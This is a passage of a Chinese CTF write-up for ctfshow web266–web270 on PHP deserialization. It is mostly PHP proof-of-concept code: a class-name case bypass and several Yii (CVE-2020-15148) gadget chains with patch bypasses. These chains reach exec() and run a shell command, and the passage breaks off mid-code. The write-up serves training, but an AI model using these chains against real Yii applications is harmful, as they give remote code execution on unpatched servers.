class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-04 23:52:24</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-05 00:17:08</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$cs</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfshow</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="keyword">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctfshowo</span>=@unserialize(<span class="variable">$cs</span>);</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ctfshow/&#x27;</span>, <span class="variable">$cs</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$ctfshowo</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>拦截点：序列化数据不能包括 ctfshow，</p><p>PHP特性：函数名和类名不区分大小写，变量名区分，例如</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616400756179-42e8ddb5-3032-4279-890a-c8309b692551.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616400756179-42e8ddb5-3032-4279-890a-c8309b692551.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Ctfshow</span></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> Ctfshow();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$user</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616400835787-767b0472-9b2a-45f2-9948-cf283fe83a84.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616400835787-767b0472-9b2a-45f2-9948-cf283fe83a84.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web267-Yii-框架-CVE"><a href="#web267-Yii-框架-CVE" class="headerlink" title="web267 Yii 框架 CVE"></a>web267 Yii 框架 CVE</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='框架审计'><i class='fas fa-tag'></i>框架审计</a></span> <span class='btn'><a class="button"  title='CVE-2020-15148'><i class='fas fa-tag'></i>CVE-2020-15148</a></span> <span class='btn'><a class="button"  title='Yii登录前'><i class='fas fa-tag'></i>Yii登录前</a></span><p>弱密码 admin/admin 登录</p><p>about 页面有个 <code>&lt;!--?view-source --&gt;</code> 提示</p><p>可以通过 <code>index.php?r=site%2Fabout&amp;view-source</code>  查看提示</p><p>这是 Yii 的路由规则，<a href="">传送门</a> ，咋知道的 Yii？通过 burp 抓包记录看到很多 yii.js php 搜了下 （</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616402276579-e299f950-a016-470d-a074-50d8bd152a0b.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616402276579-e299f950-a016-470d-a074-50d8bd152a0b.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>框架反序列化漏洞，网上应该可以搜到，一个不错的复现和挖掘文章，<a href="https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&mid=2247485129&idx=1&sn=b27e3fe845daee2fb13bb9f36f53ab40">传送门</a></p><p>有空会（咕咕预订…）额外写文章复现 （</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* tari.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;close&#x27;</span>] = [<span class="keyword">new</span> CreateAction, <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">db</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">BatchQueryResult</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$_dataReader</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;_dataReader = <span class="keyword">new</span> <span class="built_in">Generator</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">yii</span>\<span class="title">db</span>\<span class="title">BatchQueryResult</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418296385-87908407-06a1-4ca9-8794-41c979aae43d.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418296385-87908407-06a1-4ca9-8794-41c979aae43d.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418312321-77ea19e7-cfa2-46b8-a48c-60480c6b93f6.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418312321-77ea19e7-cfa2-46b8-a48c-60480c6b93f6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web268-Yii-框架-CVE-补丁绕过-1"><a href="#web268-Yii-框架-CVE-补丁绕过-1" class="headerlink" title="web268 Yii 框架 CVE 补丁绕过 1"></a>web268 Yii 框架 CVE 补丁绕过 1</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='框架审计'><i class='fas fa-tag'></i>框架审计</a></span> <span class='btn'><a class="button"  title='CVE-2020-15148'><i class='fas fa-tag'></i>CVE-2020-15148</a></span> <span class='btn'><a class="button"  title='Yii登录前'><i class='fas fa-tag'></i>Yii登录前</a></span> <span class='btn'><a class="button"  title='补丁绕过'><i class='fas fa-tag'></i>补丁绕过</a></span><p>思路类似 web267，估计是打过补丁版本</p><p>有空会（咕咕预订…）额外写文章复现 （</p><p>poc1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* tari.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">// 这里需要改为isRunning</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;isRunning&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// poc1</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Codeception</span>\<span class="title">Extension</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">RunProcess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$processes</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;processes = [<span class="keyword">new</span> <span class="built_in">Generator</span>()];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">base64_encode</span>(<span class="title">serialize</span>(<span class="title">new</span> <span class="title">Codeception</span>\<span class="title">Extension</span>\<span class="title">RunProcess</span>()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418794354-553cc83f-c9de-4c72-be0e-c0be7a18e0c6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418794354-553cc83f-c9de-4c72-be0e-c0be7a18e0c6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418838500-9a9582d8-ecb0-4a56-8cba-fd383708503b.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616418838500-9a9582d8-ecb0-4a56-8cba-fd383708503b.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web269-Yii-框架-CVE-补丁绕过-2"><a href="#web269-Yii-框架-CVE-补丁绕过-2" class="headerlink" title="web269 Yii 框架 CVE 补丁绕过 2"></a>web269 Yii 框架 CVE 补丁绕过 2</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='框架审计'><i class='fas fa-tag'></i>框架审计</a></span> <span class='btn'><a class="button"  title='CVE-2020-15148'><i class='fas fa-tag'></i>CVE-2020-15148</a></span> <span class='btn'><a class="button"  title='Yii登录前'><i class='fas fa-tag'></i>Yii登录前</a></span> <span class='btn'><a class="button"  title='补丁绕过'><i class='fas fa-tag'></i>补丁绕过</a></span><p>思路类似 web267，估计是打过补丁版本</p><p>有空会（咕咕预订…）额外写文章复现 （</p><p>poc2</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CreateAction</span>&#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="string">&#x27;exec&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="string">&#x27;cp /fla* tari.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Faker</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">yii</span>\<span class="title">rest</span>\<span class="title">CreateAction</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Generator</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$formatters</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;formatters[<span class="string">&#x27;render&#x27;</span>] = [<span class="keyword">new</span> CreateAction(), <span class="string">&#x27;run&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Faker</span>\<span class="title">Generator</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">See</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$description</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;description = <span class="keyword">new</span> <span class="built_in">Generator</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    <span class="title">use</span> <span class="title">phpDocumentor</span>\<span class="title">Reflection</span>\<span class="title">DocBlock</span>\<span class="title">Tags</span>\<span class="title">See</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Swift_KeyCache_DiskKeyCache</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$keys</span> = [];</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$path</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;path = <span class="keyword">new</span> See;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;keys = <span class="keyword">array</span>(</span><br><span class="line">                <span class="comment">// 有就行</span></span><br><span class="line">                <span class="string">&quot;suiyi&quot;</span>=&gt;<span class="keyword">array</span>(<span class="string">&quot;suiyi&quot;</span>=&gt;<span class="string">&quot;suiyi&quot;</span>)</span><br><span class="line">            );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="keyword">new</span> Swift_KeyCache_DiskKeyCache()));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616419493789-61249473-3d01-4840-a0ca-26b48fc4139b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616419493789-61249473-3d01-4840-a0ca-26b48fc4139b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616419502510-bc504266-0cb1-4d11-a324-489fbe30014e.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1616419502510-bc504266-0cb1-4d11-a324-489fbe30014e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web270-Yii-框架-CVE-补丁绕过-3"><a href="#web270-Yii-框架-CVE-补丁绕过-3" class="headerlink" title="web270 Yii 框架 CVE 补丁绕过 3"></a>web270 Yii 框架 CVE 补丁绕过 3</h2><span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span> <span class='btn'><a class="button"  title='框架审计'><i class='fas fa-tag'></i>框架审计</a></span> <span class='btn'><a class="button"  title='CVE-2020-15148'><i class='fas fa-tag'></i>CVE-2020-15148</a></span> <span class='btn'><a class="button"  title='Yii登录前'><i class='fas fa-tag'></i>Yii登录前</a></span> <span class='btn'><a class="button"  title='补丁绕过'><i class='fas fa-tag'></i>补丁绕过</a></span><p>思路类似 web267，估计是打过补丁版本</p><p>有空会（咕咕预订…）额外写文章复现 （</p><p>poc3</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">yii</span>\<span class="title">rest</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Action</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">checkAccess</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">IndexAction</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$param</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checkAccess = <span class="variable">$func</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;id = <span class="variable">$param</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 